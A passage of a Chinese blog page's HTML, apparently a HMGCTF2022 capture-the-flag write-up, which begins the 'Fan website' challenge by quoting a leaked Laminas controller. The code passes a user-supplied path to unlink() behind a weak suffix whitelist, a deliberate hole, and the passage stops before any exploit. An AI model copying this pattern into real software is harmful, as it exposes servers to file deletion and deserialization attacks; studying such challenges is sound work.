@@ -1,0 +1,989 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>[HMGCTF2022] WP - Huamang&#39;s Blog</title><meta name="Description" content="Huamang&#39;s Blog"><meta property="og:title" content="[HMGCTF2022] WP" />
+<meta property="og:description" content="WEB Fan website 首先是一个www.zip的源码泄露，是laminas框架 mvc的框架首先就是看路由 在\module\Album\src\Control" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.com/hmgctf2022/" /><meta property="og:image" content="https://example.com/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-03-24T18:46:53+08:00" />
+<meta property="article:modified_time" content="2022-03-24T18:46:53+08:00" /><meta property="og:site_name" content="Huamang&#39;s Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://example.com/logo.png"/>
+
+<meta name="twitter:title" content="[HMGCTF2022] WP"/>
+<meta name="twitter:description" content="WEB Fan website 首先是一个www.zip的源码泄露，是laminas框架 mvc的框架首先就是看路由 在\module\Album\src\Control"/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://example.com/hmgctf2022/" /><link rel="prev" href="https://example.com/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/" /><link rel="next" href="https://example.com/suctf2022/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[HMGCTF2022] WP",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/example.com\/hmgctf2022\/"
+        },"image": ["https:\/\/example.com\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  1901 ,
+        "url": "https:\/\/example.com\/hmgctf2022\/","datePublished": "2022-03-24T18:46:53+08:00","dateModified": "2022-03-24T18:46:53+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/example.com\/images\/avatar.png",
+                    "width":  320 ,
+                    "height":  320 
+                }},"author": {
+                "@type": "Person",
+                "name": "Huamang"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Huamang&#39;s Blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span>Huamang&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friends/"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw" aria-hidden="true"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/hmgctf2022/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Huamang&#39;s Blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span>Huamang&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friends/" title="">友链</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw" aria-hidden="true"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/hmgctf2022/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[HMGCTF2022] WP</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Huamang</a>
+</span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CTF</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-24">2022-03-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 1901 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">WEB</a>
+      <ul>
+        <li><a href="#fan-website">Fan website</a></li>
+        <li><a href="#smarty-calculator">Smarty calculator</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#missingfile">MissingFile</a></li>
+        <li><a href="#重要系统复现">重要系统（复现）</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="web">WEB</h1>
+<h2 id="fan-website">Fan website</h2>
+<p>首先是一个www.zip的源码泄露，是laminas框架
+mvc的框架首先就是看路由
+在\module\Album\src\Controller\AlbumController.php里面有功能点</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/e2af03750a2f41c1b75bb7537874cd72.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_19,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/e2af03750a2f41c1b75bb7537874cd72.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_19%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/e2af03750a2f41c1b75bb7537874cd72.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_19%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/e2af03750a2f41c1b75bb7537874cd72.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_19%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/e2af03750a2f41c1b75bb7537874cd72.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_19,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">namespace</span> <span class="nx">Album\Controller</span><span class="p">;</span>
+
+<span class="k">use</span> <span class="nx">Album\Model\AlbumTable</span><span class="p">;</span>
+<span class="k">use</span> <span class="nx">Laminas\Mvc\Controller\AbstractActionController</span><span class="p">;</span>
+<span class="k">use</span> <span class="nx">Laminas\View\Model\ViewModel</span><span class="p">;</span>
+<span class="k">use</span> <span class="nx">Album\Form\AlbumForm</span><span class="p">;</span>
+<span class="k">use</span> <span class="nx">Album\Form\UploadForm</span><span class="p">;</span>
+<span class="k">use</span> <span class="nx">Album\Model\Album</span><span class="p">;</span>
+
+<span class="k">class</span> <span class="nc">AlbumController</span> <span class="k">extends</span> <span class="nx">AbstractActionController</span>
+<span class="p">{</span>
+    <span class="c1">// Add this property:
+</span><span class="c1"></span>    <span class="k">private</span> <span class="nv">$table</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$white_list</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nx">AlbumTable</span> <span class="nv">$table</span><span class="p">){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">table</span> <span class="o">=</span> <span class="nv">$table</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">white_list</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;.jpg&#39;</span><span class="p">,</span><span class="s1">&#39;.jpeg&#39;</span><span class="p">,</span><span class="s1">&#39;.png&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">indexAction</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="k">new</span> <span class="nx">ViewModel</span><span class="p">([</span>
+            <span class="s1">&#39;albums&#39;</span> <span class="o">=&gt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">table</span><span class="o">-&gt;</span><span class="na">fetchAll</span><span class="p">(),</span>
+        <span class="p">]);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">addAction</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$form</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">AlbumForm</span><span class="p">();</span>
+        <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;submit&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">setValue</span><span class="p">(</span><span class="s1">&#39;Add&#39;</span><span class="p">);</span>
+
+        <span class="nv">$request</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getRequest</span><span class="p">();</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">isPost</span><span class="p">())</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="p">[</span><span class="s1">&#39;form&#39;</span> <span class="o">=&gt;</span> <span class="nv">$form</span><span class="p">];</span>
+        <span class="p">}</span>
+
+        <span class="nv">$album</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Album</span><span class="p">();</span>
+        <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">setInputFilter</span><span class="p">(</span><span class="nv">$album</span><span class="o">-&gt;</span><span class="na">getInputFilter</span><span class="p">());</span>
+        <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">setData</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">getPost</span><span class="p">());</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">isValid</span><span class="p">())</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="p">[</span><span class="s1">&#39;form&#39;</span> <span class="o">=&gt;</span> <span class="nv">$form</span><span class="p">];</span>
+        <span class="p">}</span>
+
+        <span class="nv">$album</span><span class="o">-&gt;</span><span class="na">exchangeArray</span><span class="p">(</span><span class="nv">$form</span><span class="o">-&gt;</span><span class="na">getData</span><span class="p">());</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">table</span><span class="o">-&gt;</span><span class="na">saveAlbum</span><span class="p">(</span><span class="nv">$album</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">redirect</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">toRoute</span><span class="p">(</span><span class="s1">&#39;album&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">editAction</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$id</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">fromRoute</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">===</span> <span class="nv">$id</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">redirect</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">toRoute</span><span class="p">(</span><span class="s1">&#39;album&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;action&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;add&#39;</span><span class="p">]);</span>
+        <span class="p">}</span>
+
+        <span class="c1">// Retrieve the album with the specified id. Doing so raises
+</span><span class="c1"></span>        <span class="c1">// an exception if the album is not found, which should result
+</span><span class="c1"></span>        <span class="c1">// in redirecting to the landing page.
+</span><span class="c1"></span>        <span class="k">try</span> <span class="p">{</span>
+            <span class="nv">$album</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">table</span><span class="o">-&gt;</span><span class="na">getAlbum</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">\Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">redirect</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">toRoute</span><span class="p">(</span><span class="s1">&#39;album&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;action&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;index&#39;</span><span class="p">]);</span>
+        <span class="p">}</span>
+
+        <span class="nv">$form</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">AlbumForm</span><span class="p">();</span>
+        <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">bind</span><span class="p">(</span><span class="nv">$album</span><span class="p">);</span>
+        <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;submit&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">setAttribute</span><span class="p">(</span><span class="s1">&#39;value&#39;</span><span class="p">,</span> <span class="s1">&#39;Edit&#39;</span><span class="p">);</span>
+
+        <span class="nv">$request</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getRequest</span><span class="p">();</span>
+        <span class="nv">$viewData</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;id&#39;</span> <span class="o">=&gt;</span> <span class="nv">$id</span><span class="p">,</span> <span class="s1">&#39;form&#39;</span> <span class="o">=&gt;</span> <span class="nv">$form</span><span class="p">];</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">isPost</span><span class="p">())</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nv">$viewData</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">setInputFilter</span><span class="p">(</span><span class="nv">$album</span><span class="o">-&gt;</span><span class="na">getInputFilter</span><span class="p">());</span>
+        <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">setData</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">getPost</span><span class="p">());</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">isValid</span><span class="p">())</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nv">$viewData</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">table</span><span class="o">-&gt;</span><span class="na">saveAlbum</span><span class="p">(</span><span class="nv">$album</span><span class="p">);</span>
+
+        <span class="c1">// Redirect to album list
+</span><span class="c1"></span>        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">redirect</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">toRoute</span><span class="p">(</span><span class="s1">&#39;album&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;action&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;index&#39;</span><span class="p">]);</span>
+    <span class="p">}</span>
+
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">deleteAction</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$id</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">fromRoute</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$id</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">redirect</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">toRoute</span><span class="p">(</span><span class="s1">&#39;album&#39;</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="nv">$request</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getRequest</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">isPost</span><span class="p">())</span> <span class="p">{</span>
+            <span class="nv">$del</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">getPost</span><span class="p">(</span><span class="s1">&#39;del&#39;</span><span class="p">,</span> <span class="s1">&#39;No&#39;</span><span class="p">);</span>
+
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$del</span> <span class="o">==</span> <span class="s1">&#39;Yes&#39;</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$id</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">getPost</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">);</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">table</span><span class="o">-&gt;</span><span class="na">deleteAlbum</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
+            <span class="p">}</span>
+
+            <span class="c1">// Redirect to list of albums
+</span><span class="c1"></span>            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">redirect</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">toRoute</span><span class="p">(</span><span class="s1">&#39;album&#39;</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="p">[</span>
+            <span class="s1">&#39;id&#39;</span>    <span class="o">=&gt;</span> <span class="nv">$id</span><span class="p">,</span>
+            <span class="s1">&#39;album&#39;</span> <span class="o">=&gt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">table</span><span class="o">-&gt;</span><span class="na">getAlbum</span><span class="p">(</span><span class="nv">$id</span><span class="p">),</span>
+        <span class="p">];</span>
+    <span class="p">}</span>
+
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">imgdeleteAction</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$request</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getRequest</span><span class="p">();</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">getPost</span><span class="p">()[</span><span class="s1">&#39;imgpath&#39;</span><span class="p">])){</span>
+            <span class="nv">$imgpath</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">getPost</span><span class="p">()[</span><span class="s1">&#39;imgpath&#39;</span><span class="p">];</span>
+            <span class="nv">$base</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$imgpath</span><span class="p">,</span><span class="o">-</span><span class="mi">4</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">white_list</span><span class="p">)){</span>     <span class="c1">//白名单
+</span><span class="c1"></span>                <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$imgpath</span><span class="p">);</span>
+            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+                <span class="k">echo</span> <span class="s1">&#39;Only Img File Can Be Deleted!&#39;</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">imguploadAction</span><span class="p">()</span>
+    <span class="p">{</span>
